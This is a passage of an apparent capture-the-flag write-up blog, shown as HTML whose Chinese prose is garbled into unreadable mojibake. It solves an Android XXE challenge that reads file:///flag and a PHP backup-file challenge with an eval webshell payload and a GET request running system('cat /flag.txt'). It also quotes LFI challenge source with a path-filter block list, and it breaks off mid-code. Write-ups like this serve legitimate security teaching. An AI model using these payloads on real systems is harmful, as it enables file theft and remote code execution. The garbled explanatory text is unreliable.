&lt;p>è¿™å’‹å°±apkäº†â€¦â€¦ç®—äº†ï¼Œæ‘çœ‹&lt;/p>
&lt;p>åœ¨Rest.ktä¸­çœ‹åˆ°ä¸‰ä¸ªè·¯ç”±&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119185150236.png" alt="image-20220119185150236">&lt;/p>
&lt;p>åœ¨domainç›®å½•ä¸‹å¯ä»¥çœ‹åˆ°å¯¹åº”æŽ¥æ”¶çš„å‚æ•°æ ¼å¼ï¼Œ/commentå¯ä»¥ä¼ å…¥nameå’Œmessageï¼›åœ¨CommentActivityä¸­æœ‰ä¸ª&lt;code>send_comment&lt;/code>è°ƒç”¨äº†&lt;code>postComment&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119190020847.png" alt="image-20220119190020847">&lt;/p>
&lt;p>è¿™é‡Œä½¿ç”¨äº†&lt;code>GsonConvertFactory&lt;/code>ï¼Œè¿™æ˜¯ä¸€ä¸ªè§£æžjsonçš„åº“ï¼ŒåŒæ—¶è¿™é‡Œè¿˜å¼•å…¥äº†&lt;code>retrofit2&lt;/code>ï¼Œç»™æˆ‘ä»¬xxeçš„å¯èƒ½&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-xml" data-lang="xml">&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt;&lt;/span>
&lt;span style="color:#75715e">&amp;lt;!DOCTYPE foo [
&lt;/span>&lt;span style="color:#75715e"> &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span>
&lt;span style="color:#75715e">&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///flag&amp;#34; &amp;gt;&lt;/span>
]&amp;gt;
&lt;span style="color:#f92672">&amp;lt;Comment&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;name&amp;gt;&lt;/span>&lt;span style="color:#111">&amp;amp;xxe;&lt;/span>&lt;span style="color:#f92672">&amp;lt;/name&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;message&amp;gt;&lt;/span>flag please!&lt;span style="color:#f92672">&amp;lt;/message&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/Comment&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è®°å¾—ä¿®æ”¹Content-Typeä¸ºapplication/xml&lt;/p>
&lt;p>flag{d96dc7a4-8be4-4e05-9bbf-64fcf8009182}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2020 æ€»å†³èµ›]Novel
&lt;/h4>
&lt;/summary>
&lt;p>åªçœ‹ç»™çš„é™„ä»¶ï¼Œå¤§æ¦‚æ‰«ä¸€ä¸‹çŒœæµ‹æ˜¯ä¸ªååºåˆ—åŒ–çš„é¢˜ï¼›ç„¶åŽçœ‹ä¸‹é¡µé¢äº¤äº’ï¼Œå¥½åƒè·ŸçŒœçš„æœ‰ä¸€ç‚¹ä¸å¤ªä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©ç§è—ï¼Œä¼špostè®¿é—®/back/backupï¼Œå¯¹åº”çš„æ˜¯back.class.php ä¼ å…¥filenameå’Œpathï¼Œé€‰æ‹©ä¸Šä¼ æ–‡ä»¶ä¼špostè®¿é—®/upload/profileï¼Œå¯¹åº”çš„æ˜¯upload.class.php&lt;/p>
&lt;p>index.phpä¸­å…³é”®å¤„åœ¨è¿™é‡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119223606818.png" alt="image-20220119223606818">&lt;/p>
&lt;p>backç±»ä¸­é™¤backupå¤–è¿˜æœ‰ä¸‰ä¸ªç§æœ‰å‡½æ•°&lt;code>_write&lt;/code>, &lt;code>_create&lt;/code>, &lt;code>random_code &lt;/code>ï¼Œåœ¨è°ƒç”¨&lt;code>backup&lt;/code>æ—¶ä¼šå…ˆä¾æ¬¡è°ƒç”¨è¿™å‡ ä¸ªå‡½æ•°è¿›è¡Œå¤„ç†&lt;/p>
&lt;p>&lt;code>backup&lt;/code>ä¸­ï¼Œé¦–å…ˆåˆ¤æ–­&lt;code>profile/&lt;/code>ä¸‹æœ‰æ²¡æœ‰åŒåæ–‡ä»¶ï¼Œå¯¹å†…å®¹è¿›è¡Œ&lt;code>htmlspecialchars&lt;/code>å¤„ç†åŽï¼Œå…ˆæ˜¯ç”¨&lt;code>random_code&lt;/code>ç”Ÿæˆéšæœºå¯†ç ï¼Œç„¶åŽè¿›è¡Œ&lt;/p>
&lt;pre tabindex="0">&lt;code>$this-&amp;gt;_write($dest, $this-&amp;gt;_create($password, $content));
&lt;/code>&lt;/pre>&lt;p>&lt;code>_create&lt;/code>ä¼šå°†å¯†ç å’Œå†…å®¹æ‹¼åˆ°ä¸€èµ·&lt;/p>
&lt;pre tabindex="0">&lt;code>private function _create($password, $content){
$_content='&amp;lt;?php $_GET[&amp;quot;password&amp;quot;]===&amp;quot;'.$password.'&amp;quot;?print(&amp;quot;'.$content.'&amp;quot;):exit(); ';
return $_content;
}
&lt;/code>&lt;/pre>&lt;p>éšåŽè¿›å…¥&lt;code>_write&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">_write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dest&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$f1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$dest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$f2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;private/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">random_code&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$stream_f1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$f1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;w+&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">rewind&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$f1_read&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^&amp;lt;\?php \$_GET\[\&amp;#34;password\&amp;#34;\]===\&amp;#34;[a-zA-Z0-9]{8}\&amp;#34;\?print\(\&amp;#34;.*\&amp;#34;\):exit\(\); $/s&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$f1_read&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$matches&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$matches&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">copy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$f1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$f2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$f2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php exit(); ?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆå°†&lt;code>$dest&lt;/code>å’Œä¸Šé¢&lt;code>_create&lt;/code>ç”Ÿæˆçš„å†…å®¹æ‹¼ä¸€èµ·ï¼Œç„¶åŽå¯¹å†…å®¹è¿›è¡Œè¿‡æ»¤å¤„ç†ï¼Œé€šè¿‡è¿‡æ»¤çš„è¯å°†ä¼šåœ¨&lt;code>/private&lt;/code>ç›®å½•ä¸‹å­˜ä¸€ä»½å¤‡ä»½æ–‡ä»¶å¹¶è¿”å›žå®Œæ•´è·¯å¾„ï¼Œæ²¡é€šè¿‡è¿‡æ»¤çš„è¯ä¼šåœ¨æ–‡ä»¶ä¸­å†™å…¥æ­»äº¡exit&lt;/p>
&lt;p>æˆ‘ä»¬çš„æ”»å‡»æ€è·¯æ˜¯ä¸Šä¼ ä¸€ä¸ªtxtï¼Œä¹‹åŽé€šè¿‡backç”ŸæˆåŽç¼€ä¸ºphpçš„å¤‡ä»½æ–‡ä»¶ï¼Œæ‹¿webshellï¼›æž„é€ payload&lt;/p>
&lt;p>amiz.txt&lt;/p>
&lt;pre tabindex="0">&lt;code>{${eval($_GET[1])}}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>GET /private/mKrZmVugUo.php?password=4lsUOHWN&amp;amp;1=system('cat /flag.txt');
&lt;/code>&lt;/pre>&lt;p>flag{913c1949-edef-4459-8ffc-7970b9c93f14}&lt;/p>
&lt;p>æ³¨æ„è¿™é‡Œé¡µé¢ä¸Šä¼ çš„æ—¶å€™è¦åŒå‡»submitæ‰ä¼šå¼¹å‡ºæ–‡ä»¶ç®¡ç†å™¨&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[Windows]LFI2019
&lt;/h4>
&lt;/summary>
&lt;p>å¼€å¹•é›·å‡»ï¼Œç›´æŽ¥å°±æ˜¯phpinfoçš„èƒŒæ™¯ï¼Œæ˜¾ç¤ºæ˜¯ä¸€ä¸ªwindowsç³»ç»Ÿï¼Œæ²¡æœ‰&lt;code>disable_functions&lt;/code>ä¹Ÿæ²¡æœ‰&lt;code>open_basedir&lt;/code>&lt;/p>
&lt;p>æœ‰ä¸‰ä¸ªæŒ‰é’®ï¼Œinfoæç¤ºflagåœ¨flag.phpï¼Œuploadå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œincludeå¯ä»¥åŒ…å«ï¼›ç»™äº†æºç ï¼Œè¿˜æŒºé•¿çš„ï¼ŒäºŒç™¾å¤šè¡Œ&lt;/p>
&lt;p>å¤§å¤šæ˜¯ä¸€äº›åŸºç¡€æ“ä½œï¼Œé˜²xss, ssrf, sessionï¼Œæœ‰å‡ ä¸ªç±»æ¯”è¾ƒæ˜¾çœ¼ï¼Œé¦–å…ˆæ˜¯Getï¼Œå®ƒæ˜¯includeæ—¶è°ƒç”¨çš„ç±»ï¼Œä¼šnewä¸€ä¸ªå®žä¾‹ç„¶åŽè°ƒç”¨å…¶ä¸­çš„&lt;code>get&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Get&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">nanahira&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75715e">// senpai notice me //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$exploit&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">System&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;trigger&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!@@@@@@@@@@@@@&lt;/span>&lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$$$$$$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;leak&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;leak&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">path_sanitizer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;msg&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;blocked by path sanitizer&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// wtf???? //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!@&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#75715e">// index files are *completely* disabled. //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;index&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;msg&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;you cannot include index files!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// hardened sanitizer spawned. thus we sense ambiguity //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$read_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$read_file_with_hardened_filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">path_sanitizer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$read_file&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">$read_file_with_hardened_filter&lt;/span> &lt;span style="color:#f92672">||&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$read_file&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$read_file_with_hardened_filter&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;msg&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;request blocked&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// .. and finally, include *un*exploitable file is included. //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;msg&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;invalid filename (wtf)&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;type&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­å¯¹æ–‡ä»¶åçš„wafæ˜¯&lt;code>path_sanitizer&lt;/code>ï¼Œé»‘åå•æŒºç‹ çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">path_sanitizer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$harden&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$dir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$dir_len&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">// Deny LFI/RFI/XSS //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;~&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;.\\&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;#&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$filter&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// Deny SSRF and all possible weird bypasses //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$stream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_get_wrappers&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$stream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">stream_get_transports&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$stream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">stream_get_filters&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$f_len&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$f_len&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">$f&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// Deny length //
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dir_len&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// Easy level hardening //
